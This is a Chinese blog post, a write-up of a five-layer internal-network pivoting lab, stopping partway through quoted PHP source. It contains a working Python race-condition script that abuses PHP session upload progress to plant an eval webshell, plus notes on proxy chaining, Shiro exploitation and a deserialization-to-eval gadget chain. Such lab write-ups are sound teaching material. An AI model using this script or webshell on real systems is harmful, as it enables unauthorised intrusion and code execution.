<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>记一次五层内网穿透 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="记一次五层内网穿透 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E8%81%94%E7%BA%A7-Boogipop/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:41:56.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">记一次五层内网穿透</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="——启语——"><a href="#——启语——" class="headerlink" title="——启语——"></a>——启语——</h1><p><strong>在这次五层内网漫游的过程中，感受到了内网的愉悦，同时在AIr师傅的帮助下，学会了很多新东西，也是很感谢air的耐心指导，对于一直在打外网的我突然接触内网还是有点不适应，好在多少之前玩过一阵子的内网，所以不至于太懵逼，希望自己能在接下来的时间里再接再厉（靶场只能续机2次,好难受啊！！！），所以我这次写的也会尽可能详细</strong></p>
<h2 id="0X1工具"><a href="#0X1工具" class="headerlink" title="0X1工具"></a>0X1工具</h2><p><strong>内网穿透代理</strong>：earthworm,venom,proxifiler<br><strong>信息搜集</strong>：fscan一把嗦<br><strong>VPS</strong>：我使用了2台，理论一台即可（偷懒）<br>工具很少，但是都很重要，这次也玩熟练了</p>
<p>这里我也附上我的打包链接！：</p>
<blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Y2PM0idOEZDWU6afmIjf4Q?pwd=NNUS">https://pan.baidu.com/s/1Y2PM0idOEZDWU6afmIjf4Q?pwd=NNUS</a><br>提取码：NNUS</p>
</blockquote>
<h2 id="0X2解题"><a href="#0X2解题" class="headerlink" title="0X2解题"></a>0X2解题</h2><h3 id="0X2-0-Proxifiler配置"><a href="#0X2-0-Proxifiler配置" class="headerlink" title="0X2.0 Proxifiler配置"></a>0X2.0 Proxifiler配置</h3><p>最终配置如下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102316711-e6703063-1b94-4156-896f-f96dabf41fc8.png#averageHue=%23f5f4f3&clientId=ud3ef7058-52a8-4&from=paste&height=178&id=u38cd3438&name=image.png&originHeight=223&originWidth=582&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11189&status=done&style=none&taskId=ue4f06d3c-80ac-4d7d-bc0d-0a7525b240d&title=&width=465.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102354522-51de285f-fa74-4a55-9e53-b8cb6f3c908a.png#averageHue=%23f9f9f7&clientId=ud3ef7058-52a8-4&from=paste&height=219&id=ue85a6897&name=image.png&originHeight=274&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18145&status=done&style=none&taskId=u4891c0b6-08d4-45f5-84d7-be19a9ce0f2&title=&width=616.8" alt="image.png"><br>首先先看结果图：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668100339640-f7750421-5036-4988-8a53-52127fb8264b.png#averageHue=%230c0b0b&clientId=u5a7d21ef-bb2b-4&from=paste&height=161&id=u88e76dbd&name=image.png&originHeight=201&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6524&status=done&style=none&taskId=uc1f15b53-0822-41b1-8afd-f124e7ff424&title=&width=574.4" alt="image.png"><br>拓扑图就如上，A代表的是我们的VPS，一共五层，所以说是五层代理</p>
<h3 id="0X2-1-一层代理"><a href="#0X2-1-一层代理" class="headerlink" title="0X2.1 一层代理"></a>0X2.1 一层代理</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668100596244-57e6b28e-2244-48df-865d-64870227bd24.png#averageHue=%23fdfcfc&clientId=u5a7d21ef-bb2b-4&from=paste&height=215&id=u1abe25ac&name=image.png&originHeight=269&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8158&status=done&style=none&taskId=u84c17815-375c-499f-81e7-0119960cda6&title=&width=420" alt="image.png"><br>这里也挺有讲究的，讲的是裸包含的几种骚方法，这里air也提供了一篇总结的很好的文章：</p>
<hr>
<p>下面我用的是条件竞争，也是比较普遍的方法，自己写了个脚本就放下面了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://36.138.41.66:39818/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line">sessionid=<span class="string">&#x27;boogipop&#x27;</span> <span class="comment">#PHPSESSID的值</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/1.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span> <span class="comment">#将木马写入1.php</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment">#上传一个50k的文件</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,data=&#123;</span><br><span class="line">            <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span> <span class="comment">#将这段代码写入session文件中</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid <span class="comment">#同上，PHPSESSID的值</span></span><br><span class="line">        &#125;,</span><br><span class="line">         files=&#123;</span><br><span class="line">             <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;boogipop.jpg&#x27;</span>,fileBytes) <span class="comment">#上传这个文件单单只是为了抓个包，其他一点用都没有</span></span><br><span class="line">         &#125;</span><br><span class="line">         )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid      <span class="comment">#包含session文件让第一个eval执行，然后执行第二个eval</span></span><br><span class="line">        &#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;1.php&#x27;</span>) <span class="comment">#获得回显</span></span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++perfect+++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()       <span class="comment">#开启线程</span></span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:        <span class="comment">#多线程操作</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()           <span class="comment">#将信号标志设置为True，并唤醒所有处于等待状态的线程。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>竞争完毕后蚁剑上号（这里也有些little story，到底是选哥斯拉还是冰蝎还是蚁剑呢，这里左右试了试发现还是蚁剑最好用，别问我为什么，其他的bug感觉就是多，虽然ui界面丰富，功能也全一些，咳咳不bb了）<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101236744-4732d474-5f4c-438b-8ffb-66436ffdd1ab.png#averageHue=%23ededed&clientId=ud3ef7058-52a8-4&from=paste&height=177&id=u1fdaa4d1&name=image.png&originHeight=221&originWidth=1284&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19840&status=done&style=none&taskId=u4010d7b0-5591-404d-ba15-58c5e0e41b5&title=&width=1027.2" alt="image.png"><br>第一层结束</p>
<h3 id="0x2-2-二层代理"><a href="#0x2-2-二层代理" class="headerlink" title="0x2.2 二层代理"></a>0x2.2 二层代理</h3><p>拿下了第一个webshell，要干的事情还很多不能休息，找个地方上传工具，fscan和ew或者venom<br>记得给x权限啊<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101456860-9c04b2e3-a03b-420b-9fbf-eacd5ef70cdc.png#averageHue=%230a0a0a&clientId=ud3ef7058-52a8-4&from=paste&height=202&id=uc7fcc217&name=image.png&originHeight=252&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12842&status=done&style=none&taskId=u31ff6573-1dd6-46fb-9f11-62950dc9c78&title=&width=476" alt="image.png"><br>先看一下他的网段，看到了个10.18.127.153，扫一下C段，先挂代理再扫，信息会更多<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101652758-1dc8095b-0061-4870-b15b-2da7ad91f1b3.png#averageHue=%231a1817&clientId=ud3ef7058-52a8-4&from=paste&height=213&id=uf1527ae4&name=image.png&originHeight=266&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19304&status=done&style=none&taskId=u4e6ec8f1-eb08-484d-9cba-651ab37e409&title=&width=640" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101725839-a5e6eab7-7624-47a5-a6f2-e5977b869a48.png#averageHue=%23faf9f8&clientId=ud3ef7058-52a8-4&from=paste&height=338&id=u31a4f04e&name=image.png&originHeight=423&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55469&status=done&style=none&taskId=u7c1cd9fd-cfa6-43e7-97ef-d0f27e6a440&title=&width=976" alt="image.png"><br>看到了shiro框架，直接当一回脚本小子：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101866049-3bf0a29e-d391-4926-b99a-e48707742d24.png#averageHue=%23f7f6f6&clientId=ud3ef7058-52a8-4&from=paste&height=433&id=uf6a386f0&name=image.png&originHeight=541&originWidth=1204&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88314&status=done&style=none&taskId=uce17d34b-f995-43fc-a6f7-7bf9c0dbb8d&title=&width=963.2" alt="image.png"><br>看到了rememberme字样：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101941668-0a883185-612a-439d-8dd0-c48536157d69.png#averageHue=%23eeedec&clientId=ud3ef7058-52a8-4&from=paste&height=434&id=u04336646&name=image.png&originHeight=543&originWidth=1065&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60918&status=done&style=none&taskId=uef2183f2-8c36-407f-84aa-874119096fb&title=&width=852" alt="image.png"><br>直接就可以<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101914599-bdbd5533-f417-4994-8709-d4ee5c1ee71d.png#averageHue=%231b1701&clientId=ud3ef7058-52a8-4&from=paste&height=38&id=u3167d2ba&name=00A5687B.png&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3272&status=done&style=none&taskId=u71665f3f-e9f0-4259-aea2-02697dcae1a&title=&width=38.4" alt="00A5687B.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101919429-e24d0573-3d09-48ac-af91-a31f09ddbe1c.png#averageHue=%233e3521&clientId=ud3ef7058-52a8-4&from=paste&height=38&id=u09a21753&name=00A57B67.png&originHeight=48&originWidth=48&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3590&status=done&style=none&taskId=u93d8520a-c3cb-4250-b21c-fe6d3f86e1c&title=&width=38.4" alt="00A57B67.png">进去了，上号：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668101975754-46eb8419-bdaf-47f9-9aaa-626528ae91cb.png#averageHue=%23ededed&clientId=ud3ef7058-52a8-4&from=paste&height=172&id=u7360e51a&name=image.png&originHeight=215&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22092&status=done&style=none&taskId=uf47d137c-71e9-4bfd-bfc8-6945a49e462&title=&width=993.6" alt="image.png"><br>拿到了第二个flag，二层告一段落</p>
<h3 id="0x2-3-三层代理"><a href="#0x2-3-三层代理" class="headerlink" title="0x2.3 三层代理"></a>0x2.3 三层代理</h3><p>层层笔逼近了属于是，接下来也是重复一样的步骤：<br>设置代理，fscan扫，访问内网<br>我们刚刚拿下了第二个主机，我们也是把我们的工具上传，扫一下，再代理<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102211717-b18030e1-35cb-4003-86a6-49d48f24d434.png#averageHue=%230a0909&clientId=ud3ef7058-52a8-4&from=paste&height=227&id=u65852531&name=image.png&originHeight=284&originWidth=1188&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28166&status=done&style=none&taskId=u190a3371-322f-4abc-a7b0-385e9993531&title=&width=950.4" alt="image.png"><br>看网段，这次是128段，扫一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102277042-46d36b4e-09bc-4615-b1b0-0c6e8fb69a00.png#averageHue=%23f7f6f5&clientId=ud3ef7058-52a8-4&from=paste&height=299&id=u03356aab&name=image.png&originHeight=374&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50284&status=done&style=none&taskId=ufc580c0a-7632-4839-9456-566082f5a87&title=&width=1012" alt="image.png"><br>目的是去访问10.18.128.173<br>设置代理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102418168-4cfdf029-cfec-4e77-b381-79c75410c738.png#averageHue=%23424242&clientId=ud3ef7058-52a8-4&from=paste&height=47&id=u2127823c&name=image.png&originHeight=59&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5332&status=done&style=none&taskId=u5ec47fef-8c4c-4026-9e6a-5b7f710b4a4&title=&width=535.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102426898-7feb44da-8066-4ca2-b847-4f3bbbf3f2b3.png#averageHue=%23090706&clientId=ud3ef7058-52a8-4&from=paste&height=64&id=u1c733a77&name=image.png&originHeight=80&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5096&status=done&style=none&taskId=u892758ca-270b-4a77-b4f7-64eb61f8c1c&title=&width=534.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102432027-fbb000e7-8065-4849-b661-592f7399933c.png#averageHue=%230b0a09&clientId=ud3ef7058-52a8-4&from=paste&height=127&id=u86d30ef9&name=image.png&originHeight=159&originWidth=759&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6673&status=done&style=none&taskId=u9d4c3869-a16e-4c00-9eab-b512ebde4a8&title=&width=607.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102536520-40d2ae51-9f39-4cdd-9cbe-42ab37cc1121.png#averageHue=%23262524&clientId=ud3ef7058-52a8-4&from=paste&height=98&id=uc76a8a81&name=image.png&originHeight=123&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7273&status=done&style=none&taskId=ueb6fdc1c-609c-49f4-b2f1-be55e7677e5&title=&width=664.8" alt="image.png"><br>成功转接，这边要注意哦，ip别搞混了，从第一台靶机可以知道第一层的内网ip：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102474654-b0ca7355-1aba-42ab-882e-907b78691845.png#averageHue=%23fbf9f7&clientId=ud3ef7058-52a8-4&from=paste&height=26&id=ubf1093ed&name=image.png&originHeight=33&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5900&status=done&style=none&taskId=u832d5b86-7274-4881-ad72-9a726bcc672&title=&width=682.4" alt="image.png"><br>访问内网题目：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668102541672-20e538f8-1d72-453f-af63-26acb31342cb.png#averageHue=%23fcfcfb&clientId=ud3ef7058-52a8-4&from=paste&height=170&id=u036ed408&name=image.png&originHeight=212&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16424&status=done&style=none&taskId=ub58c28ee-cd79-44b1-b16f-a49dbfe0be8&title=&width=956" alt="image.png"><br>用dirsearch扫出来<a href="http://www.zip源码：">www.zip源码：</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt; (只允许上传JPG图片)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>( <span 